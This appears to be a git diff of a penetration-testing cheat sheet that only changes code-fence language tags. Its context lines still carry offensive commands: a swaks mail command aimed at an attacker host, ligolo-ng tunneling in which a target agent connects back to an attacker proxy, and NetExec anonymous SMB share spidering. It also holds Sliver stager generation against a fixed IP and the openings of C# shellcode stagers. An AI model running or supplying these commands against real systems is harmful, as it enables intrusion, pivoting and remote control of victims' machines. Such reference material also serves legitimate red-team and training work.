@@ -124,7 +124,7 @@ scp some.sh user@10.10.10.10:/tmp/some.sh   # On attacker
 
 - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
 
-```c
+```console
 swaks --server example.com --port 587 --auth-user "user@example.com" --auth-password "password" --to "user@target.com" --from ""user@example.com" --header "Subject: foobar" --body "\\\<LHOST>\x"
 ```
 
@@ -134,47 +134,47 @@ swaks --server example.com --port 587 --auth-user "user@example.com" --auth-pass
 
 #### Prepare Tunnel Interface
 
-```c
+```console
 $ sudo ip tuntap add user $(whoami) mode tun ligolo
 ```
 
-```c
+```console
 $ sudo ip link set ligolo up
 ```
 
 #### Setup Proxy on Attacker Machine
 
-```c
+```console
 $ ./proxy -laddr <LHOST>:443 -selfcert
 ```
 
 #### Setup Agent on Target Machine
 
-```c
+```console
 $ ./agent -connect <LHOST>:443 -ignore-cert
 ```
 
 #### Configure Session
 
-```c
+```console
 ligolo-ng » session
 ```
 
-```c
+```console
 [Agent : user@target] » ifconfig
 ```
 
-```c
+```console
 $ sudo ip r add 172.16.1.0/24 dev ligolo
 ```
 
-```c
+```console
 [Agent : user@target] » start
 ```
 
 #### Port Forwarding
 
-```c
+```console
 [Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
 ```
@@ -183,7 +183,7 @@ $ sudo ip r add 172.16.1.0/24 dev ligolo
 
 > https://github.com/Pennyw0rth/NetExec
 
-```c
+```console
 $ sudo apt-get install pipx git
 $ pipx ensurepath
 $ pipx install git+https://github.com/Pennyw0rth/NetExec
@@ -191,7 +191,7 @@ $ pipx install git+https://github.com/Pennyw0rth/NetExec
 
 ### Installation via Poetry
 
-```c
+```console
 $ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
 $ git clone https://github.com/Pennyw0rth/NetExec
 $ cd NetExec
@@ -201,7 +201,7 @@ $ poetry run NetExec
 
 ### Modules
 
-```c
+```console
 $ netexec ldap -L
 $ netexec mysql -L
 $ netexec smb -L
@@ -211,7 +211,7 @@ $ netexec winrm -L
 
 ### Common Commands
 
-```c
+```console
 $ netexec smb <RHOST> -u '' -p '' --shares
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
@@ -329,7 +329,7 @@ stage-listener --url http://10.8.0.14:8443 --profile win64-beacon --prepend-size
 generate stager --lhost 10.8.0.14 --lport 8443 --arch amd64 --format c --save /tmp
 ```
 
-```c
+```console
 #include "windows.h"
 
 int main()
@@ -491,7 +491,7 @@ void Execute(Shellcode shellcode) {
 
 #### Simple HTTP C# Stager:
 
-```c#
+```cs
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
@@ -548,7 +548,7 @@ namespace Sliver_stager
 
 #### Encrypted C# Stager 
 
-```c#
+```cs
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -634,7 +634,7 @@ namespace Sliver_stager
 
 #### Another Simple HTTP Stager
 
-```c#
+```cs
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
